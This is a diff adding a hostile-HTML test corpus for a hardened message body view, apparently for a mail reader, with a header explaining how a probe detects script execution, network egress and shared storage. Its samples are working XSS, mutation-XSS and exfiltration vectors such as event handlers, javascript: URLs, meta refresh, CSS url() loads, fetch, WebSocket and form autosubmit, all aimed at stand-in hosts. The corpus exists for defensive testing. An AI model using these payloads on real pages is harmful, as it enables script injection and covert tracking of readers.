@@ -1,0 +1,247 @@
+# The hostile-HTML corpus: the P0 body-view spike's input, and NFR-40 method 2's.
+#
+# Every sample is loaded **raw** — not sanitized — into a body view configured exactly as the
+# application configures it. That is the stronger test: N-1 and NFR-20 are properties of the
+# view, and a view that held only because the sanitizer had already removed the attack would be
+# proving the sanitizer. The roadmap's pass condition is absolute: no sample achieves script
+# execution, network egress, or storage shared with another view, on either engine.
+#
+# Format: a line `=== <id>` starts a sample; everything up to the next such line is its HTML.
+# Lines starting with `#` before the first sample are comments. The probe expands:
+#
+#   {{EXEC}}      a script statement that loads sift-resource://probe/exec and posts to the
+#                 execution bridge. Reaching either is script execution.
+#   {{FILE_CSS}}  a file: URL to a stylesheet the probe writes, which styles `div.f` with a
+#                 background from sift-resource://probe/chain.
+#   {{ID}}        the sample's id.
+#
+# and prepends a sentinel image at sift-resource://probe/ok, which proves the document loaded
+# at all: a sample that observed nothing because nothing rendered proves nothing.
+#
+# The probe's markers are what it judges by:
+#
+#   sift-resource://probe/exec   reachable only by script
+#   sift-resource://probe/chain  reachable only if a data:, file: or blob: resource loaded —
+#                                the schemes WebKit resolves without consulting any handler
+#   sift-resource://probe/nav    reachable only if a navigation proceeded
+#   http(s)://egress.invalid/    any load under a foreign scheme is egress
+#   192.0.2.1:9                  TEST-NET-1: where the socket-level vectors (preconnect,
+#                                dns-prefetch, websockets) aim. **No detector observes these on
+#                                WKWebView** — they reach no handler, and the engine's sockets
+#                                are not visible from the probe's process — so their samples
+#                                are carried for the engines and detectors that can, and for
+#                                the script a websocket needs, which the execution detector does
+#                                see.
+#
+# Each sample is also run in a control view — script on, no rule list, no CSP, no navigation
+# policy — so every detector is shown to fire on this engine before its silence in the
+# hardened view is counted as a pass.
+
+=== script-inline
+<script>{{EXEC}}</script>
+
+=== script-src-data
+<script src="data:text/javascript,(new(Image)).src='sift-resource://probe/exec'"></script>
+
+=== script-src-http
+<script src="http://egress.invalid/script.js"></script>
+
+=== script-src-internal
+<script src="sift-resource://probe/script"></script>
+
+=== script-svg
+<svg><script>{{EXEC}}</script></svg>
+
+=== event-img-onerror
+<img src="sift-resource://probe/missing" onerror="{{EXEC}}">
+
+=== event-svg-onload
+<svg onload="{{EXEC}}"></svg>
+
+=== event-body-onload
+<body onload="{{EXEC}}">
+
+=== event-details-ontoggle
+<details open ontoggle="{{EXEC}}"><summary>s</summary>d</details>
+
+=== event-autofocus-onfocus
+<input autofocus onfocus="{{EXEC}}">
+
+=== event-style-onload
+<style onload="{{EXEC}}">p{}</style>
+
+=== javascript-url-iframe
+<iframe src="javascript:{{EXEC}}"></iframe>
+
+=== javascript-url-object
+<object data="javascript:{{EXEC}}"></object>
+
+=== mxss-noscript
+<noscript><p title="</noscript><img src=sift-resource://probe/missing onerror={{EXEC}}>"></noscript>
+
+=== mxss-math-style
+<math><mtext><table><mglyph><style><img src=sift-resource://probe/missing onerror={{EXEC}}></style></mglyph></table></mtext></math>
+
+=== mxss-svg-foreignobject
+<svg><foreignObject><iframe srcdoc="<script>{{EXEC}}</script>"></iframe></foreignObject></svg>
+
+=== mxss-title-rcdata
+<title><img src=sift-resource://probe/missing onerror={{EXEC}}></title>
+
+=== meta-csp-widen
+<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline' 'unsafe-eval'">
+<script>{{EXEC}}</script>
+<img src="http://egress.invalid/csp-widen">
+
+=== meta-refresh-http
+<meta http-equiv="refresh" content="0;url=http://egress.invalid/refresh">
+
+=== meta-refresh-internal
+<meta http-equiv="refresh" content="0;url=sift-resource://probe/nav">
+
+=== meta-refresh-self
+<meta http-equiv="refresh" content="0">
+
+=== meta-refresh-data
+<meta http-equiv="refresh" content="0;url=data:text/html,<img src=sift-resource://probe/chain>">
+
+=== meta-set-cookie
+<meta http-equiv="set-cookie" content="probe={{ID}}; path=/">
+
+=== iframe-http
+<iframe src="http://egress.invalid/frame"></iframe>
+
+=== iframe-internal
+<iframe src="sift-resource://probe/nav"></iframe>
+
+=== iframe-data
+<iframe src="data:text/html,<img src=sift-resource://probe/chain>"></iframe>
+
+=== iframe-srcdoc
+<iframe srcdoc="<img src=sift-resource://probe/nav><script>{{EXEC}}</script>"></iframe>
+
+=== object-data-html
+<object data="data:text/html,<img src=sift-resource://probe/chain>" width="20" height="20"></object>
+
+=== object-http
+<object data="http://egress.invalid/object" type="text/html" width="20" height="20"></object>
+
+=== object-internal
+<object data="sift-resource://probe/nav" type="text/html" width="20" height="20"></object>
+
+=== embed-data-html
+<embed src="data:text/html,<img src=sift-resource://probe/chain>" width="20" height="20">
+
+=== embed-http
+<embed src="http://egress.invalid/embed" width="20" height="20">
+
+=== base-href
+<base href="http://egress.invalid/base/">
+<img src="relative.png">
+
+=== img-http
+<img src="http://egress.invalid/img">
+
+=== img-https
+<img src="https://egress.invalid/img">
+
+=== img-blob
+<img src="blob:sift-resource://document/00000000-0000-0000-0000-000000000000">
+
+=== img-srcset
+<img srcset="http://egress.invalid/1x.png 1x, https://egress.invalid/2x.png 2x">
+
+=== picture-source
+<picture><source srcset="https://egress.invalid/picture.png"><img src="sift-resource://probe/missing"></picture>
+
+=== input-image
+<input type="image" src="http://egress.invalid/input">
+
+=== legacy-background-attribute
+<table background="http://egress.invalid/table-bg"><tr><td background="http://egress.invalid/td-bg">x</td></tr></table>
+
+=== video-poster-and-source
+<video poster="http://egress.invalid/poster" width="20" height="20"><source src="http://egress.invalid/video.mp4"></video>
+
+=== audio-autoplay
+<audio src="https://egress.invalid/audio.mp3" autoplay preload="auto"></audio>
+
+=== track
+<video width="20" height="20"><track default src="http://egress.invalid/track.vtt"></video>
+
+=== svg-image-href
+<svg width="20" height="20"><image href="http://egress.invalid/svg-image" width="20" height="20"/></svg>
+
+=== svg-use-external
+<svg width="20" height="20"><use href="http://egress.invalid/sprite.svg#a"/></svg>
+
+=== svg-feimage
+<svg width="20" height="20"><filter id="f"><feImage href="http://egress.invalid/feimage"/></filter><rect width="20" height="20" filter="url(#f)"/></svg>
+
+=== css-inline-background
+<div style="background-image:url(http://egress.invalid/bg);width:20px;height:20px"></div>
+
+=== css-image-set
+<div style="background-image:image-set('https://egress.invalid/set.png' 1x);width:20px;height:20px"></div>
+
+=== css-cursor-list-border-mask
+<ul style="list-style-image:url(http://egress.invalid/list)"><li>x</li></ul>
+<div style="cursor:url(http://egress.invalid/cursor),auto;border:10px solid;border-image:url(http://egress.invalid/border) 30;-webkit-mask-image:url(http://egress.invalid/mask);width:20px;height:20px"></div>
+
+=== css-content-url
+<style>p.c::before{content:url(http://egress.invalid/content)}</style><p class="c">x</p>
+
+=== css-style-import
+<style>@import url("http://egress.invalid/import.css");</style>
+
+=== css-font-face
+<style>@font-face{font-family:probe;src:url(https://egress.invalid/font.woff)}</style>
+<p style="font-family:probe">text in the probe font</p>
+
+=== css-svg-style-import
+<svg><style>@import url(http://egress.invalid/svg-import.css);</style></svg>
+
+=== link-stylesheet-http
+<link rel="stylesheet" href="http://egress.invalid/sheet.css">
+
+=== link-stylesheet-data
+<link rel="stylesheet" href="data:text/css,div.d{background-image:url(sift-resource://probe/chain)}">
+<div class="d" style="width:20px;height:20px"></div>
+
+=== link-stylesheet-file
+<link rel="stylesheet" href="{{FILE_CSS}}">
+<div class="f" style="width:20px;height:20px"></div>
+
+=== link-stylesheet-blob
+<link rel="stylesheet" href="blob:sift-resource://document/00000000-0000-0000-0000-000000000001">
+
+=== link-hints
+<link rel="prefetch" href="http://egress.invalid/prefetch">
+<link rel="preload" as="image" href="http://egress.invalid/preload">
+<link rel="icon" href="http://egress.invalid/icon">
+<link rel="manifest" href="http://egress.invalid/manifest">
+<link rel="modulepreload" href="http://egress.invalid/module.js">
+
+=== link-preconnect
+<link rel="preconnect" href="http://192.0.2.1:9/">
+<link rel="dns-prefetch" href="//192.0.2.1:9">
+
+=== script-websocket
+<script>new WebSocket('ws://192.0.2.1:9/');{{EXEC}}</script>
+
+=== script-fetch-and-storage
+<script>{{EXEC}};fetch('http://egress.invalid/fetch');localStorage.setItem('probe','1');document.cookie='probe=1';indexedDB.open('probe')</script>
+
+=== script-worker
+<script>{{EXEC}};new Worker('data:text/javascript,fetch(%22http://egress.invalid/worker%22)')</script>
+
+=== form-autosubmit
+<form id="p" action="http://egress.invalid/form" method="post"><input name="n" value="v"></form>
+<script>{{EXEC}};document.getElementById('p').submit()</script>
+
+=== anchor-ping
+<a id="a" href="sift-resource://probe/nav" ping="http://egress.invalid/ping">link</a>
+<script>{{EXEC}};document.getElementById('a').click()</script>
+
+=== window-open
+<script>{{EXEC}};window.open('http://egress.invalid/popup')</script>
